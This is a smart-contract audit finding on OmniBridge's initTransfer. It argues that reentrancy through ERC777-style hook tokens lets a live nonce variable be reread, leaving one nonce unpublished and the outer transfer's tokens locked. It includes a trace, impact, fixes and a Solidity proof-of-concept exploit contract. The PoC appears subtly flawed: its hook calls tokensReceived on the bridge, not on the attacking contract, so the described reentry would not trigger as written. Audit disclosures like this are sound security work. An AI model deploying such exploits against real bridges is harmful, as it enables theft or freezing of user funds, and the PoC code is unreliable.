### Title
Reentrancy via ERC777/hook tokens in `initTransfer` causes nonce collision and permanent fund lock - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer()` increments `currentOriginNonce` at the top of the function but reads the **state variable** again — not a local copy — when passing it to `initTransferExtension()` and `emit InitTransfer` at the bottom. A token with a transfer hook (ERC777 `tokensReceived`, or any `_afterTokenTransfer` override) can reenter `initTransfer` during the `safeTransferFrom` call, causing the outer call to emit and publish a Wormhole message with the **wrong nonce**, permanently locking the outer call's tokens in the bridge with no corresponding cross-chain settlement.

---

### Finding Description

In `OmniBridge.initTransfer()`, the nonce is incremented at line 381: [1](#0-0) 

Then, for a plain ERC20 token (not a bridge token, not a custom minter), a `safeTransferFrom` is executed at lines 407–411: [2](#0-1) 

After this external call, the function reads `currentOriginNonce` **again** (the live state variable, not a cached local) when calling `initTransferExtension` and emitting the event: [3](#0-2) 

There is **no `ReentrancyGuard` or `nonReentrant` modifier** anywhere in the EVM contracts — confirmed by a full search of `evm/src/**/*.sol`.

**Reentrancy execution trace:**

| Step | `currentOriginNonce` | Action |
|------|----------------------|--------|
| Outer call enters `initTransfer` | N-1 → **N** | nonce incremented |
| `safeTransferFrom` fires hook | N | callback to attacker |
| Inner call enters `initTransfer` | N → **N+1** | nonce incremented again |
| Inner call's `safeTransferFrom` completes | N+1 | no hook this time |
| Inner call: `initTransferExtension(…, N+1, …)` | N+1 | Wormhole msg published with nonce **N+1** |
| Inner call: `emit InitTransfer(…, N+1, …)` | N+1 | event emitted with nonce **N+1** |
| Outer call resumes | N+1 | **state variable is now N+1** |
| Outer call: `initTransferExtension(…, N+1, …)` | N+1 | Wormhole msg published with nonce **N+1** again |
| Outer call: `emit InitTransfer(…, N+1, …)` | N+1 | event emitted with nonce **N+1** again |

Result: **nonce N is never published**; nonce N+1 is published twice. The NEAR bridge processes one N+1 message and rejects the duplicate. The outer call's tokens are locked in the bridge with no corresponding cross-chain message.

In `OmniBridgeWormhole.initTransferExtension`, the `originNonce` parameter is embedded directly in the Wormhole payload: [4](#0-3) 

So both the on-chain event and the Wormhole message carry the wrong nonce for the outer call.

---

### Impact Explanation

The outer call's tokens are transferred into the bridge contract at line 407–411 but the corresponding cross-chain message (nonce N) is never published. The NEAR bridge has no record of nonce N and will never release funds on the destination chain. The tokens are **permanently and irrecoverably locked** in the EVM bridge contract. This matches: *Critical — Permanent freezing, irrecoverable lock, or unclaimable settlement of user or protocol funds in bridge, token, or vault flows.*

Additionally, if the NEAR bridge enforces sequential nonce ordering (waiting for nonce N before accepting N+1), skipping nonce N would **freeze all subsequent bridge transfers globally**.

---

### Likelihood Explanation

- ERC777 tokens are widely deployed on mainnet and implement `tokensReceived` hooks by the ERC777 standard.
- Any token with `_afterTokenTransfer` or `_beforeTokenTransfer` overrides that call back to the sender/recipient qualifies.
- `initTransfer` accepts **any** ERC20 token address — there is no allowlist or token registry check for the plain-ERC20 path.
- The attacker only needs to hold a hook token and call `initTransfer` twice (outer + reentrant inner call). No privileged role is required.

---

### Recommendation

1. **Cache `currentOriginNonce` in a local variable** immediately after incrementing it, and use the local variable in `initTransferExtension` and `emit InitTransfer`:

```solidity
currentOriginNonce += 1;
uint64 nonce = currentOriginNonce; // cache before any external call
// ... token transfer ...
initTransferExtension(msg.sender, tokenAddress, nonce, ...);
emit BridgeTypes.InitTransfer(msg.sender, tokenAddress, nonce, ...);
```

2. **Add `ReentrancyGuardUpgradeable`** from OpenZeppelin and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`.

3. Apply the same fix to `initTransfer1155`, which has the identical pattern: [5](#0-4) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Hook token: calls tokensReceived on recipient after every transfer
contract HookToken is ERC20 {
    constructor(uint256 supply) ERC20("HookToken", "HT") {
        _mint(msg.sender, supply);
    }
    function _afterTokenTransfer(address, address to, uint256) internal override {
        if (to != address(0)) {
            (bool ok,) = to.call(abi.encodeWithSignature("tokensReceived()"));
            // ignore return value
        }
    }
}

contract ReentrancyExploit {
    address bridge;
    address hookToken;
    address safeToken; // any plain ERC20
    bool entered;

    constructor(address _bridge, address _hookToken, address _safeToken) {
        bridge = _bridge;
        hookToken = _hookToken;
        safeToken = _safeToken;
    }

    function attack(uint128 amount) external {
        IERC20(hookToken).approve(bridge, type(uint256).max);
        IERC20(safeToken).approve(bridge, type(uint256).max);
        // Outer call: nonce N assigned, safeTransferFrom fires hook
        IOmniBridge(bridge).initTransfer(hookToken, amount, 0, 0, "attacker.near", "");
    }

    // Called by HookToken._afterTokenTransfer when bridge receives tokens
    function tokensReceived() external {
        if (!entered) {
            entered = true;
            // Inner call: nonce increments to N+1, completes normally
            IOmniBridge(bridge).initTransfer(safeToken, 1e18, 0, 0, "attacker.near", "");
            entered = false;
        }
    }
    // After attack:
    // - Wormhole message with nonce N+1 published TWICE
    // - Nonce N never published
    // - Outer call's hookToken amount locked forever in bridge
}

interface IOmniBridge {
    function initTransfer(address,uint128,uint128,uint128,string calldata,string calldata) external payable;
}
```

**Expected state after attack:**
- `currentOriginNonce` = N+1
- Two Wormhole messages published, both encoding nonce N+1
- `InitTransfer` event emitted twice with nonce N+1
- Nonce N: no event, no Wormhole message, tokens locked in bridge permanently

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L381-381)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L406-412)
```text
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L415-436)
```text
        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-489)
```text
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L129-149)
```text
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
```
